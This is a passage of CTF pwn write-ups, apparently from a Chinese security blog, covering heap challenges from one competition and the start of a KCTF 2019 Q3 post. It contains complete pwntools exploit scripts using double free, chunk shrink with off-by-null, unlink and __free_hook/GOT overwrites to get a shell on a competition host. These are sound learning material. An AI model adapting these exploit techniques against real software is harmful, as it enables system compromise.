<h3 id="17-py"><a href="#17-py" class="headerlink" title="17.py"></a>17.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./hard2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./hard2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50010</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#show proc base</span></span><br><span class="line">    Show(str(<span class="number">0xffffffff</span><span class="number">-18</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">    proc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(<span class="string">'proc base =&gt; '</span> + hex(proc_base))</span><br><span class="line">    <span class="comment"># add</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>):</span><br><span class="line">        Create(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xd</span>):</span><br><span class="line">        Free(<span class="number">0</span>)<span class="comment">#fake size 0x21</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#overwrite cnt</span></span><br><span class="line">    Free(<span class="number">0xffffffff</span><span class="number">-4</span>)</span><br><span class="line">    <span class="comment">#double free</span></span><br><span class="line">    Free(<span class="number">0x2e</span>)</span><br><span class="line">    Show(<span class="number">0x2e</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x180</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line">    Free(<span class="number">0x2e</span>)</span><br><span class="line">    Free(<span class="number">0xffffffff</span><span class="number">-5</span>)<span class="comment">#to add more</span></span><br><span class="line"></span><br><span class="line">    Create(p64(proc_base+<span class="number">0x202068</span>))</span><br><span class="line">    Create(<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">    Create(<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    Create(p64(proc_base+elf.got[<span class="string">'free'</span>])+p64(<span class="number">0x21</span>))</span><br><span class="line">    Show(<span class="number">0xffffffff</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        Free(<span class="number">0</span>)</span><br><span class="line">    Create(p64(proc_base+<span class="number">0x202078</span>))</span><br><span class="line">    Create(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Create(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Create(p64(libc_base+libc.symbols['system']))</span></span><br><span class="line">    Create(p64(libc_base+gadgets[<span class="number">0</span>]))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>这个题比较巧妙，程序的Add会添加一个node一个chunk，node里放chunk，分配大小固定为0x20。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  _QWORD *node_chunk; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *content_chunk; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_6020E0[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      node_chunk = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      content_chunk = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !node_chunk || !content_chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error occured!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *node_chunk = content_chunk;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Give me your size : "</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Now give me your content"</span>);</span><br><span class="line">      get_input(content_chunk, size);</span><br><span class="line">      qword_6020E0[i] = (__int64)node_chunk;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Th3 1ist is fu11"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞存在于Edit，可以edit的次数是三次，第一次Edit，程序会把index处的node里的chunk地址写在0x602100处，第二次Edit就会输入这个chunk里的值。如果我们Add几个chunk，Edit其中一个，则0x602100会有其chunk地址，释放其中一个，则node和chunk进入fastbins[0x30]，我们再去编辑chunk，可以malloc到我们设计的地方，这里我们修改低字节为’\x60’，为chunk1 node的堆地址。free的顺序是node-&gt;chunk，Add的顺序是一样的，因此第二次Add的node为第一次的chunk，第二次的chunk为fake chunk，即node1，我们修改chunk2内容，即修改了node1的chunk1_addr。</p>
<p>之后show(1)即可泄露地址，注意这里只能泄露俩字节，需要爆破0xff，但是有意思的是a64l这个函数的前几位和system一样的，只有后面俩字节不一样，因此可以通过它泄露后两个字节，进而Edit其为system地址，输入choice的时候输入/bin/sh即可拿到shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Edit</span><span class="params">(_DWORD *edit_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> size_1; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( qword_602100 &amp;&amp; edit_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Give me your size : "</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    size = atoi(&amp;buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now give me your content"</span>);</span><br><span class="line">    get_input((<span class="keyword">char</span> *)qword_602100, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"edit_time:%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)--*edit_num);</span><br><span class="line">    qword_602100 = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Give me your index : "</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    index = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Out of list"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( qword_6020E0[index] &amp;&amp; *edit_num )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Give me your size : "</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">      size_1 = atoi(&amp;buf);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Now give me your content"</span>);</span><br><span class="line">      v3 = get_input(*(<span class="keyword">char</span> **)qword_6020E0[index], size_1);</span><br><span class="line">      qword_602100 = *(_QWORD *)qword_6020E0[index];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"edit_time:%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)--*edit_num);</span><br><span class="line">      <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"nothing"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn10'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn10'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50010</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size :'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'size :'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit1</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size :'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    Edit1(<span class="number">1</span>,<span class="string">'\x60'</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x8</span>,p64(elf.got[<span class="string">'a64l'</span>]))<span class="comment">#0</span></span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\x20\n'</span>)</span><br><span class="line">    atol_addr = u16(p.recv(<span class="number">2</span>))</span><br><span class="line">    system_addr = atol_addr - libc.symbols[<span class="string">'a64l'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">'system addr =&gt; '</span> + hex(system_addr))</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">2</span>,p32(system_addr)[:<span class="number">2</span>])</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>pwn12是一道很典型的chunk shrink题目，似乎是第一次做到类似的题目，非常有必要整理做题的套路。</p>
<h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>这道题上来就mallopt禁止了fastbin，让我想起来RCTF那道难到吐血的large bin attack的题目，到最后也没什么好思路，最后照着17师傅的exp做了一遍，是非常典型的chunk shrink题目emm。</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有Add、Edit、Show、Delete，只能分配0x78及以下的chunk。Edit有off-by-null，由于不能分配0xf0的chunk，不能构造chunk extend。这里使用shrink来构造Overlap chunk。又因为没开PIE，最后可以unlink。</p>
<p>chunk shrink构造：<br>chunk0(0x80)#0<br>chunk1(0x80)#1<br>chunk2(0x80)#2<br>chunk3(0x80)#3<br>chunk4(0x80)#4<br>chunk4(0x80)#5<br>Free掉1-3，Edit(0)通过off-by-one修改chunk1的size为0x100，注意我们Free这三个堆块之后，chunk4的prev_size是0x180。</p>
<p>Malloc(0x78)*2，我们会分配到chunk1和chunk2。Free(1)和Free(4)，Free(1)的时候1和2不会合并，而Free(4)的时候由于chunk4的prev_size为0x180，因此其寻找上一个chunk会找到chunk1，因为我们释放了chunk1，所以chunk2的prev_in_use为0，chunk1-chunk4合并，重新分配，造成chunk2的ovelapping。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn12'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn12'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50012</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#init</span></span><br><span class="line">    p.recvuntil(<span class="string">"what's your name?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"what's your info?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x200</span>)</span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - libc_offset</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#0-7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4 == 5</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Show(<span class="number">5</span>)</span><br><span class="line">    heap_addr = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">'heap addr =&gt; '</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4 == 5</span></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x28</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x78</span>)<span class="comment">#4</span></span><br><span class="line">    bss_addr = <span class="number">0x602310</span></span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    Edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(bss_addr<span class="number">-0x18</span>)+p64(bss_addr<span class="number">-0x10</span>)+p32(<span class="number">0x20</span>))</span><br><span class="line">    Edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Edit(<span class="number">3</span>,p32(<span class="number">0</span>)+p32(<span class="number">0x78</span>)+p64(libc.symbols[<span class="string">'__free_hook'</span>])+p32(<span class="number">0x1</span>)+p32(<span class="number">0x78</span>)+p32(<span class="number">0x6022f8</span>))</span><br><span class="line">    Edit(<span class="number">2</span>,p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>第五空间安全大赛</category>
      </categories>
  </entry>
  <entry>
    <title>KCTF 2019 Q3</title>
    <url>/2020/09/03/KCTFQ3/</url>
    <content><![CDATA[<h1 id="KCTF2019-Q3"><a href="#KCTF2019-Q3" class="headerlink" title="KCTF2019 Q3"></a>KCTF2019 Q3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看雪的比赛，第三赛季，后面俩pwn好像是kernel的，打扰了，做了第一个pwn就忙项目去了，第二个等今天放wp之后看着大佬的学了一下</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>程序有off-by-one，libc是2.23，出题人自己写了个malloc_hook，每次malloc的时候都会重写malloc_hook，因此覆写不可行，没有show，这个还是爆破该stdout，给了heap地址，最后构造fake vtable劫持文件控制流。</p>
